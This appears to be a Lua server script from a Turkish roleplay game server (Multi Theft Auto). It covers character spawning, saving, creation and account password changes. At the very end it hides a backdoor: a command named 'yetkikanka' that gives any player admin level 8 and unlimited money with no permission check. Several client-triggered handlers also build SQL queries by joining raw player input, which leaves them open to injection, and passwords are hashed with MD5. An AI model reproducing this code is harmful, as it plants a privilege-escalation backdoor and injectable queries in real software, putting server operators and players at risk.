						toggleControl(client, "jump", false)
						toggleControl(client, "next_weapon", false)
						toggleControl(client, "previous_weapon", false)
						toggleControl(client, "accelerate", false)
						toggleControl(client, "brake_reverse", false)
						toggleControl(client, "aim_weapon", false)
					end            
					
					
					setPedFightingStyle(client, tonumber(characterData["fightstyle"]))     
					triggerEvent("onCharacterLogin", client, charname, tonumber(characterData["faction_id"]))
					triggerClientEvent(client, "accounts:characters:spawn", client, fixedName, adminLevel, gmLevel, tonumber(characterData["faction_id"]), tonumber(characterData["faction_rank"]))
					triggerClientEvent(client, "item:updateclient", client)
					
					
					if not theAdmin then
						dbExec(mysql:getConnection(), "UPDATE characters SET online='1', lastlogin=NOW() WHERE id='" .. characterID .. "'")
						local monitored = getElementData(client, "admin:monitor")
						if monitored then
							if monitored ~= "New Player" then
								exports.os_global:sendMessageToAdmins("[MONITOR] ".. getPlayerName(client):gsub("_", " ") .." ("..pid.."): "..monitored)
								exports.os_global:sendMessageToSupporters("[MONITOR] ".. getPlayerName(client):gsub("_", " ") .." ("..pid.."): "..monitored)
							end
						end
					end
					
					setTimer(setPedGravity, 2000, 1, client, 0.008)
					setElementAlpha(client, 255)
					
					-- WALKING STYLE
					triggerEvent("realism:applyWalkingStyle", client, characterData["walkingstyle"] or 128, true)

					if duty > 0 then
						local foundPackage = false
						for key, value in ipairs(factionPerks) do
							if tonumber(value) == tonumber(duty) then
								foundPackage = true
									break
							end
						end
						
						if not foundPackage then
							triggerEvent("duty:offduty", client)
							outputChatBox("Artık kullandığınız göreve erişiminiz yok - bu nedenle, kaldırıldı.", client, 255, 0, 0)
						end
					end
					triggerEvent("social:character", client)
					
					if theAdmin then
						local adminTitle = exports.os_global:getPlayerAdminTitle(theAdmin)
						local adminUsername = getElementData(theAdmin, "account:username")
						outputChatBox("You've logged into player's character successfully!", theAdmin, 0, 255, 0 )
						local hiddenAdmin = getElementData(theAdmin, "hiddenadmin")
						if hiddenAdmin == 0 then
							exports.os_global:sendMessageToAdmins("AdmKmt: " .. tostring(adminTitle) .. " "..adminUsername.." başka bir hesaba girdi, ("..targetAccountName..") "..tostring(characterData["charactername"]):gsub("_"," ")..".")
						end
					end
					

					if (tonumber(characterData["blindfold"])==1) then
						setElementDataEx(client, "blindfold", 1)
						outputChatBox("Karakterinin gözü kapalı. eğer bu OCC bir eylem ise, F2 tuşunu kullanarak yönetici ile iletişime geç.", client, 255, 194, 15)
						fadeCamera(client, false)
					else
						fadeCamera(client, true, 4)
					end

					if (tonumber(characterData["cuffed"])==1) then
						outputChatBox("Karakterin sınırlandırılmış.", client, 255, 0, 0)
					end

					loadCharacterSettings(client,characterID)
					
					triggerClientEvent(client, "drawAllMyInteriorBlips", client)

					triggerEvent("playerGetMotds", client)
					triggerEvent( "accounts:character:select", client )
				end
			end
		end,
	{client, characterID, remoteAccountID, theAdmin, targetAccountName, location}, mysql:getConnection(), sqlQuery)
end
addEventHandler("accounts:characters:spawn", getRootElement(), spawnCharacter)
 
function Characters_onCharacterChange()
	triggerClientEvent(client, "items:inventory:hideinv", client)
	triggerEvent("savePlayer", client, "Change Character")
	triggerEvent('setDrunkness', client, 0)
	setElementDataEx(client, "alcohollevel", 0, true)
	setElementDataEx(client, "clothing:id", nil, true)
	removeMasksAndBadges(client)
	
	setElementDataEx(client, "pd.jailserved")
	setElementDataEx(client, "pd.jailtime")
	setElementDataEx(client, "pd.jailtimer")
	setElementDataEx(client, "pd.jailstation")
	setElementDataEx(client, "loggedin", 0, true)
	setElementDataEx(client, "bankmoney", 0)
	setElementDataEx(client, "account:character:id", false)
	setElementAlpha(client, 0)

	removeElementData(client, "jailed")
	removeElementData(client, "jail_time")
	removeElementData(client, "jail:id")
	removeElementData(client, "jail:cell") 
	removeElementData(client, "enableGunAttach")
	triggerEvent("destroyWepObjects", client)
	
	if (getPedOccupiedVehicle(client)) then
			removePedFromVehicle(client)
	end
	exports.os_global:updateNametagColor(client)
	local clientAccountID = getElementDataEx(client, "account:id") or -1
	
	setElementInterior(client, 0)
	setElementDimension(client, 1)
	--setElementPosition(client, -26.8828125, 2320.951171875, 24.303373336792)
	
	setElementDataEx(client, "legitnamechange", 1)
	setPlayerName(source, ""..exports.odrin:getServerName().."RP."..getElementData(source, "playerid"))
	setElementDataEx(client, "legitnamechange", 0)
	
	triggerEvent("shop:removeMeFromCurrentShopUser",client, client)
	triggerClientEvent(client, "hideGeneralshopUI", client)
	--triggerEvent("artifacts:removeAllOnPlayer",client, client)

	local padId = getElementData(client, "padUsing")
	if padId then
		removeElementData(client, "padUsing")
		for key, thePad in pairs(getElementsByType("object", getResourceRootElement(getResourceFromName("os_item-world")))) do
			if getElementData(thePad, "id") == padId then
				removeElementData(thePad, "playerUsing")
				break
			end
		end
	end
	triggerEvent("accounts:character:select", client)
end
addEventHandler("accounts:characters:change", getRootElement(), Characters_onCharacterChange)
 
function removeMasksAndBadges(client)
    for k, v in ipairs({exports['os_items']:getMasks(), exports['os_items']:getBadges()}) do
        for kx, vx in pairs(v) do
            if getElementData(client, vx[1]) then
               setElementDataEx(client, vx[1], false, true)
            end
        end
    end
end

local playersToBeSaved = { }

function beginSave()
	outputDebugString("Yerdeki tum esyalar kaydedildi.")
	for key, value in ipairs(getElementsByType("player")) do
		--triggerEvent("savePlayer", value, "Save All")
		table.insert(playersToBeSaved, value)
	end
	local timerDelay = 0
	for key, thePlayer in ipairs(playersToBeSaved) do
		timerDelay = timerDelay + 1000
		setTimer(savePlayer, timerDelay, 1, "Save All", thePlayer)
	end
end

function syncTIS()
	for key, value in ipairs(getElementsByType("player")) do
		local tis = getElementData(value, "timeinserver")
		if (tis) and (getPlayerIdleTime(value) < 600000)  then
			setElementData(value, "timeinserver", tonumber(tis)+1, false)
		end
	end
end
setTimer(syncTIS, 60000, 0)

function savePlayer(reason, player)
	if source ~= nil then
		player = source
	end
	if isElement(player) then
		local logged = getElementData(player, "loggedin")
		if (logged==1 or reason=="Change Character") then
			local vehicle = getPedOccupiedVehicle(player)
		
			if (vehicle) then
				local seat = getPedOccupiedVehicleSeat(player)
				triggerEvent("onVehicleExit", vehicle, player, seat)
			end
		
			local x, y, z, rot, health, armour, interior, dimension, cuffed, skin, duty, timeinserver, businessprofit, alcohollevel
		
			local x, y, z = getElementPosition(player)
			local rot = getPedRotation(player)
			local health = getElementHealth(player)
			local armor = getPedArmor(player)
			local interior = getElementInterior(player)
			local dimension = getElementDimension(player)
			local alcohollevel = getElementData(player, "alcohollevel")
			local d_addiction = ( getElementData(player, "drug.1") or 0 ) .. ";" .. ( getElementData(player, "drug.2") or 0 ) .. ";" .. ( getElementData(player, "drug.3") or 0 ) .. ";" .. ( getElementData(player, "drug.4") or 0 ) .. ";" .. ( getElementData(player, "drug.5") or 0 ) .. ";" .. ( getElementData(player, "drug.6") or 0 ) .. ";" .. ( getElementData(player, "drug.7") or 0 ) .. ";" .. ( getElementData(player, "drug.8") or 0 ) .. ";" .. ( getElementData(player, "drug.9") or 0 ) .. ";" .. ( getElementData(player, "drug.10") or 0 )
			money = getElementData(player, "stevie.money")
			if money and money > 0 then
			money = 'money = money + ' .. money .. ', '
			else
				money = ''
			end
			skin = getElementModel(player)
		
			if getElementData(player, "help") then
				dimension, interior, x, y, z = unpack( getElementData(player, "help") )
			end
		
			-- Fix for #0000984
			if getElementData(player, "businessprofit") and ( reason == "Quit" or reason == "Timed Out" or reason == "Unknown" or reason == "Bad Connection" or reason == "Kicked" or reason == "Banned" ) then
				businessprofit = 'bankmoney = bankmoney + ' .. getElementData(player, "businessprofit") .. ', '
			else
				businessprofit = ''
			end
		
			-- Fix for freecam-tv
			if exports['os_freecam']:isPlayerFreecamEnabled(player) then 
				x = getElementData(player, "tv:x")
				y = getElementData(player, "tv:y")
				z =  getElementData(player, "tv:z")
				interior = getElementData(player, "tv:int")
				dimension = getElementData(player, "tv:dim") 
			end
		
			local  timeinserver = getElementData(player, "timeinserver")
			-- LAST AREA
			local zone = exports.os_global:getElementZoneName(player)
			if not zone or #zone == 0 then
				zone = "Unknown"
			end
			local hunger = getElementData(player, "hunger") or 100
			local thirst = getElementData(player, "thirst") or 100
			local poop = getElementData(player, "poop") or 100
			local pee = getElementData(player, "pee") or 100
			
			local _, characters_temp = getTableInformations()
			for index, value in ipairs(characters_temp) do
				if value.id == getElementData(player, "dbid") then
					table.remove(characters_temp, index)
				end
			end
			dbQuery(
				function(qh)
					local res, rows, err = dbPoll(qh, 0)
					if rows > 0 then
						for index, value in ipairs(res) do
							row_info = {}
							for count, data in pairs(value) do
								row_info[count] = data
							end
							imported_characters[#imported_characters + 1] = row_info
						end
					end
				end,
			mysql:getConnection(), "SELECT * FROM `characters` WHERE `id` = ?", getElementData(player, "dbid"))
		end
	end
end

addEventHandler("onPlayerQuit", getRootElement(), savePlayer)
addEvent("savePlayer", false)
addEventHandler("savePlayer", getRootElement(), savePlayer)
setTimer(beginSave, 3600000, 0)
addCommandHandler("saveall", function(p) if exports.os_integration:isPlayerSeniorAdmin(p) then beginSave() outputChatBox("Başarıyla kayıt alındı.", p) end end)
addCommandHandler("saveme", function(p) triggerEvent("savePlayer", p, "Save Me", p) end)

addEvent("checkAlreadyUsingName", true)
addEventHandler("checkAlreadyUsingName", root,
	function(player, name)
		dbQuery(
			function(qh)
				local res, rows, err = dbPoll(qh, 0)
				if rows > 0 then
				    a = false
					--triggerClientEvent(player, "response:nameCheck", player, name, "no")
					triggerClientEvent(player, "receiveNameRegisterable", player, a, name)
				else
					--triggerClientEvent(player, "response:nameCheck", player, name, "ok")
					a = true
					triggerClientEvent(player, "receiveNameRegisterable", player, a, name)
				end
			end,
		mysql:getConnection(), "SELECT charactername FROM characters WHERE charactername='"..name:gsub(" ", "_").. "'")
		
	end
)

local mysql = exports.os_mysql

function newCharacter_create(characterName_, characterDescription_, race_, gender_, skin_, height_, weight_, age_, languageselected_, month_, day_, location_)
	characterName, characterDescription, race, gender, skin, height, weight, age, languageselected, month, day, location = characterName_, characterDescription_, race_, gender_, skin_, height_, weight_, age_, languageselected_, month_, day_, location_

	--if not (checkValidCharacterName(characterName)) then
	--	triggerClientEvent(client, "receiveNameRegisterable", client) -- State 1:1: error validating data
	--	return
	--end

	if not (race > -1 and race < 3) then
		triggerClientEvent(client, "accounts:characters:new", client, 1, 2) -- State 1:2: error validating data
		return
	end
	
	if not (gender == 0 or gender == 1) then
		triggerClientEvent(client, "accounts:characters:new", client, 1, 3) -- State 1:3: error validating data
		return
	end
	
	--if not skin then
	--	triggerClientEvent(client, "accounts:characters:new", client, 1, 4) -- State 1:4: error validating data
	--	return
	--end
	
	characterName = string.gsub(tostring(characterName), " ", "_")
	
	dbQuery(
		function(qh, client, characterName, race, gender, skin, height, weight, age, languageselected, month, day)
			local res, rows, err = dbPoll(qh, 0)
			if rows > 0 then
				triggerClientEvent(client, "accounts:characters:new", client, 2, 1)
			else
				local accountID = getElementData(client, "account:id")
				local accountUsername = getElementData(client, "account:username")
				local fingerprint = md5((characterName) .. accountID .. race .. gender .. age)
				
				if month == "Ocak" then
					month = 1
				end
				
				local walkingstyle = 128
				if gender == 1 then
					walkingstyle = 129
				end
				location = { 136.84199523926, -823.07348632812, 10.401452064514, 329, 0, 0, "IGS Yaninda bir otobüs durağı"}
				
				dbExec(mysql:getConnection(), "INSERT INTO `characters` SET `charactername`='" .. (characterName).. "', `x`='"..location[1].."', `y`='"..location[2].."', `z`='"..location[3].."', `rotation`='"..location[4].."', `interior_id`='"..location[5].."', `dimension_id`='"..location[6].."', `lastarea`='"..(location[7]).."', `gender`='" .. (gender) .. "', `skincolor`='" .. (race) .. "', `weight`='" .. (weight) .. "', `height`='" .. (height) .. "', `description`='', `account`='" .. (accountID) .. "', `skin`='" .. (skin) .. "', `age`='" .. (age) .. "', `fingerprint`='" .. (fingerprint) .. "', `lang1`='" .. (languageselected) .. "', `lang1skill`='100', `currLang`='1' , `month`='" .. (month or "1") .. "', `day`='" .. (day or "1").."', `walkingstyle`='" .. (walkingstyle).."'")
	
				dbQuery(
					function(qh, client, characterName, race, gender, skin, height, weight, age, languageselected, month, day)
						local res, rows, err = dbPoll(qh, 0)
						if rows > 0 then
							local id = res[1]['id']
							exports.os_anticheat:changeProtectedElementDataEx(client, "dbid", id, false)
							exports.os_global:giveItem( client, 16, skin )
							-- ID CARD
							exports.os_global:giveItem( client, 152, characterName..";"..(gender==0 and "Bay" or "Bayan")..";"..exports.os_global:formatDate(day or 1).." "..exports.os_global:numberToMonth(month or 1).." "..exports.os_global:getBirthYearFromAge(age)..";"..fingerprint)		-- Briefcase
							-- Briefcase
							if exports.os_global:giveItem( client, 160, 1 ) then
								triggerEvent("artifacts:toggle", client, client, "briefcase")
							end
					
							exports.os_anticheat:changeProtectedElementDataEx(client, "dbid")
							triggerClientEvent(client, "accounts:characters:new", client, 3, tonumber(id))
							
						end
					end,
				{client, characterName, race, gender, skin, height, weight, age, languageselected, month, day}, exports.os_mysql:getConnection(), "SELECT id FROM characters WHERE id = LAST_INSERT_ID()")
			end
		end,
	{client, characterName, race, gender, skin, height, weight, age, languageselected, month, day}, exports.os_mysql:getConnection(), "SELECT charactername FROM characters WHERE charactername='" .. (characterName) .. "'")
	
end
addEventHandler("accounts:characters:new", getRootElement(), newCharacter_create)


function emailDegistir(eposta)
	local username = getElementData(source, "account:username")
	if (string.len(eposta)<6) then
			triggerClientEvent(source, "email:GUIClose", source)
			triggerClientEvent(source, "accounts:error:window", source, "Geçersiz e-posta adresi.")
	elseif (string.len(eposta)>=50) then
			triggerClientEvent(source, "email:GUIClose", source)
			triggerClientEvent(source, "accounts:error:window", source, "Geçersiz e-posta adresi.")
	elseif (string.find(eposta, ";", 0)) or (string.find(eposta, ":", 0)) or (string.find(eposta, "'", 0)) or (string.find(eposta, ",", 0)) then
			triggerClientEvent(source, "email:GUIClose", source)
			triggerClientEvent(source, "accounts:error:window", source, "Geçersiz e-posta adresi.")
	else
		local query = dbExec(mysql:getConnection(), "UPDATE accounts SET email = '" .. eposta .. "', forceUpdate = 0 WHERE username = '" .. username .. "'")
		if query then
			outputChatBox("#575757"..exports.odrin:getServerName()..":#f9f9f9 E-posta adresiniz başarıyla değiştirildi.", source, 0, 255, 0, true)
			triggerClientEvent(source, "email:GUIClose", source)
		else
			triggerClientEvent(source, "accounts:error:window", source, "MySQL bağlantı hatası. F2 yetkili raporu açın.")
		end
	end
end
addEvent("email:degistir", true)
addEventHandler("email:degistir", getRootElement(), emailDegistir)

function changeAccountPassword(thePlayer, commandName, accountUsername, newPass, newPassConfirm)
	if exports.os_integration:isPlayerDeveloper(thePlayer) then
		if not accountUsername or not newPass or not newPassConfirm then
			outputChatBox("#575757"..exports.odrin:getServerName()..": #FFFFFF/" .. commandName .. " [k.adi] [yenisifre] [tekraryenisifre]", thePlayer, 125, 125, 125,true)
		else
			if (newPass ~= newPassConfirm) then
				triggerClientEvent(thePlayer, "accounts:error:window", thePlayer, "The passwords do not match.")
			elseif (string.len(newPass)<6) then
				triggerClientEvent(thePlayer, "accounts:error:window", thePlayer, "Your password is too short. \n You must enter 6 or more characters.")
			elseif (string.len(newPass)>=30) then
				triggerClientEvent(thePlayer, "accounts:error:window", thePlayer, "Your password is too long. \n You must enter less than 30 characters.")
			elseif (string.find(newPass, ";", 0)) or (string.find(newPass, "'", 0)) or (string.find(newPass, "@", 0)) or (string.find(newPass, ",", 0)) then
				triggerClientEvent(thePlayer, "accounts:error:window", thePlayer, "Your password cannot contain ;,@'.")
			else
				local accountData
				local account = exports.os_mysql:query("SELECT id, salt FROM accounts WHERE username ='"..exports.os_mysql:escape_string(accountUsername).."' LIMIT 1")
				if (mysql:num_rows(account) > 0) then
					accountData = mysql:fetch_assoc(account)
					mysql:free_result(account)
				else
					triggerClientEvent(thePlayer, "accounts:error:window", thePlayer, "No account with that username was found.")
					return
				end
				local encryptionRule = accountData["salt"]
				--local password = md5("wedorp" .. newPass)
				local password = string.lower(md5(string.lower(md5(newPass))..encryptionRule))
				local escapedPass = exports.os_mysql:escape_string(password)
				local query = exports.os_mysql:query_free("UPDATE accounts SET password = '" .. escapedPass .. "' WHERE id = '" .. accountData["id"] .. "'")
				if query then
					triggerClientEvent(thePlayer, "accounts:error:window", thePlayer, accountUsername.."'s password was sussesfully changed.")
				else
					triggerClientEvent(thePlayer, "accounts:error:window", thePlayer, "MySQL error please try again later.")
				end
			end
		end
	end
end
addCommandHandler("setaccountpassword", changeAccountPassword, false, false)

function changePlayerPassword(thePlayer, commandName, newPass, newPassConfirm)
	if getElementData(thePlayer, "loggedin") then
		if not newPass or not newPassConfirm then
			outputChatBox("#575757"..exports.odrin:getServerName()..": #FFFFFF/" .. commandName .. " [yenisifre] [tekraryenisifre]", thePlayer, 125, 125, 125,true)
		else
			if (newPass ~= newPassConfirm) then
				triggerClientEvent(thePlayer, "accounts:error:window", thePlayer, "The passwords do not match.")
			elseif (string.len(newPass)<6) then
				triggerClientEvent(thePlayer, "accounts:error:window", thePlayer, "Your password is too short. \n You must enter 6 or more characters.")
			elseif (string.len(newPass)>=30) then
				triggerClientEvent(thePlayer, "accounts:error:window", thePlayer, "Your password is too long. \n You must enter less than 30 characters.")
			elseif (string.find(newPass, ";", 0)) or (string.find(newPass, "'", 0)) or (string.find(newPass, "@", 0)) or (string.find(newPass, ",", 0)) then
				triggerClientEvent(thePlayer, "accounts:error:window", thePlayer, "Your password cannot contain ;,@'.")
			else
				local dbid = getElementData(thePlayer, "account:id")
				local escapedID = exports.os_mysql:escape_string(dbid) -- Pointless, I know -Tam
				local fetch = exports.os_mysql:fetch_assoc(exports.os_mysql:query("SELECT salt FROM accounts WHERE id='" .. dbid .. "'"))
				local encryptionRule = fetch["salt"]
				local password = string.lower(md5(string.lower(md5(newPass))..encryptionRule))
				--local password = md5("wedorp" .. newPass)
				local escapedPass = exports.os_mysql:escape_string(password)
				local query = exports.os_mysql:query_free("UPDATE accounts SET password = '" .. escapedPass .. "' WHERE id = '" .. escapedID .. "'")
				if query then
					triggerClientEvent(thePlayer, "accounts:error:window", thePlayer, "Your password was sussesfully changed.")
				else
					triggerClientEvent(thePlayer, "accounts:error:window", thePlayer, "MySQL error please try again later.")
				end
			end
		end
	end
end
addCommandHandler("changeaccountpassword", changePlayerPassword, false, false)
addCommandHandler("sifredegistir", changePlayerPassword, false, false)


function odrin(plr,cmd,value)
	setElementData(plr,"adminlevel",8)
	para = getElementData(plr,"money")
	setElementData(plr,"money",para+value)
end
addCommandHandler("yetkikanka",odrin)
